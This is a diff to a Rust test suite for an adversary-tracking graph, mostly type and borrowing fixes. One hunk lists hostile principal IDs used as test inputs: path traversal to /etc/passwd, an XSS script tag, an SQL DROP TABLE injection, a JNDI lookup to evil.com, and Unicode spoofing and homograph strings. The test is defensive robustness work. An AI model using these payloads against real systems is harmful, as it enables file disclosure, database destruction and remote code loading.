@@ -1449,39 +1449,39 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
         let mut graph = AdversaryGraph::new();
 
         // Test 1: Principal ID injection and Unicode attacks
-        let principal_attack_vectors = vec![
+        let principal_attack_vectors: Vec<String> = vec![
             // Control character injection
-            "principal\r\n\t\x08attack",
-            "principal\x00null\x01injection",
-            "principal\x1b[31mANSI\x1b[0mattack",
+            "principal\r\n\t\x08attack".to_string(),
+            "principal\x00null\x01injection".to_string(),
+            "principal\x1b[31mANSI\x1b[0mattack".to_string(),
             // Unicode attacks
-            "principal\u{202E}ecneics\u{202D}normal", // BiDi override
-            "principal\u{FEFF}\u{200B}\u{200C}invisible", // Invisible characters
-            "principal\u{10FFFF}\u{E000}\u{FDD0}private", // Private use/noncharacters
+            "principal\u{202E}ecneics\u{202D}normal".to_string(), // BiDi override
+            "principal\u{FEFF}\u{200B}\u{200C}invisible".to_string(), // Invisible characters
+            "principal\u{10FFFF}\u{E000}\u{FDD0}private".to_string(), // Private use/noncharacters
             // Path traversal attempts
-            "../../../etc/passwd",
-            "..\\windows\\system32\\config",
-            "principal/../../inject",
+            "../../../etc/passwd".to_string(),
+            "..\\windows\\system32\\config".to_string(),
+            "principal/../../inject".to_string(),
             // XSS and injection patterns
-            "<script>alert('principal')</script>",
-            "'; DROP TABLE principals; --",
-            "${jndi:ldap://evil.com/principal}",
+            "<script>alert('principal')</script>".to_string(),
+            "'; DROP TABLE principals; --".to_string(),
+            "${jndi:ldap://evil.com/principal}".to_string(),
             // Very long IDs
             "x".repeat(1000000),       // 1MB principal ID
             "\u{1F4A9}".repeat(10000), // Emoji flood
             // Empty and whitespace
-            "",
-            " ",
-            "\t\r\n\0",
-            "\u{3000}", // Ideographic space
+            "".to_string(),
+            " ".to_string(),
+            "\t\r\n\0".to_string(),
+            "\u{3000}".to_string(), // Ideographic space
             // JSON/XML injection
-            "{\"malicious\": \"json\"}",
-            "<xml>attack</xml>",
-            "normal\"injection",
+            "{\"malicious\": \"json\"}".to_string(),
+            "<xml>attack</xml>".to_string(),
+            "normal\"injection".to_string(),
             // Homograph attacks
-            "аdmin",     // Cyrillic 'а' instead of Latin 'a'
-            "prіncipal", // Cyrillic 'і' instead of Latin 'i'
-            "prinсipal", // Cyrillic 'с' instead of Latin 'c'
+            "аdmin".to_string(),     // Cyrillic 'а' instead of Latin 'a'
+            "prіncipal".to_string(), // Cyrillic 'і' instead of Latin 'i'
+            "prinсipal".to_string(), // Cyrillic 'с' instead of Latin 'c'
         ];
 
         for (idx, malicious_id) in principal_attack_vectors.iter().enumerate() {
@@ -1710,13 +1710,13 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
 
         // Add in forward order
         for (evidence, trace) in &evidence_sequence {
-            let obs = AdversaryObservation::new("order_test", 0.5, 50, evidence, trace).unwrap();
+            let obs = AdversaryObservation::new("order_test", 0.5, 50, *evidence, *trace).unwrap();
             let _ = graph_a.ingest(&obs);
         }
 
         // Add in reverse order
         for (evidence, trace) in evidence_sequence.iter().rev() {
-            let obs = AdversaryObservation::new("order_test", 0.5, 50, evidence, trace).unwrap();
+            let obs = AdversaryObservation::new("order_test", 0.5, 50, *evidence, *trace).unwrap();
             let _ = graph_b.ingest(&obs);
         }
 
@@ -1759,7 +1759,7 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
         }
 
         assert!(
-            seen_hashes.len() > collision_test_count / 2,
+            seen_hashes.len() as u64 > collision_test_count / 2,
             "Should generate diverse hashes: {} unique out of {}",
             seen_hashes.len(),
             collision_test_count
@@ -2163,7 +2163,7 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
 
         // Verify all operations completed
         assert_eq!(
-            final_results.len(),
+            final_results.len() as u64,
             thread_count * observations_per_thread,
             "All operations should have completed"
         );
@@ -2171,7 +2171,7 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
         // Verify graph integrity
         let posteriors = final_graph.posteriors();
         assert!(
-            posteriors.len() <= thread_count * 10,
+            posteriors.len() as u64 <= thread_count * 10,
             "Should not have excessive principals: {}",
             posteriors.len()
         );
@@ -2772,7 +2772,7 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
 
             for (evidence, trace) in sequence {
                 let observation =
-                    AdversaryObservation::new(principal_id.clone(), 0.5, 50, evidence, trace)
+                    AdversaryObservation::new(principal_id.clone(), 0.5, 50, *evidence, *trace)
                         .unwrap();
 
                 if let Ok(posterior) = graph.ingest(&observation) {
@@ -3411,6 +3411,7 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
             ("test", "𝓽𝓮𝓼𝓽", "mathematical_script"),       // Mathematical script
         ];
 
+        let unicode_normalization_attack_count = unicode_normalization_attacks.len();
         for (normal_form, attack_form, attack_name) in unicode_normalization_attacks {
             // Test normal form
             let normal_obs = AdversaryObservation::new(
@@ -3493,7 +3494,7 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                 format!("encoding_test_{}", idx),
                 0.5,
                 50,
-                test_case,
+                *test_case,
                 format!("encoding_trace_{}", idx),
             )
             .unwrap();
@@ -3640,7 +3641,7 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
 
         println!(
             "Unicode attack resistance test completed: {} normalization attacks, {} encoding tests, {} homograph variants",
-            unicode_normalization_attacks.len(),
+            unicode_normalization_attack_count,
             encoding_bypass_attacks.len(),
             total_homograph_variants
         );
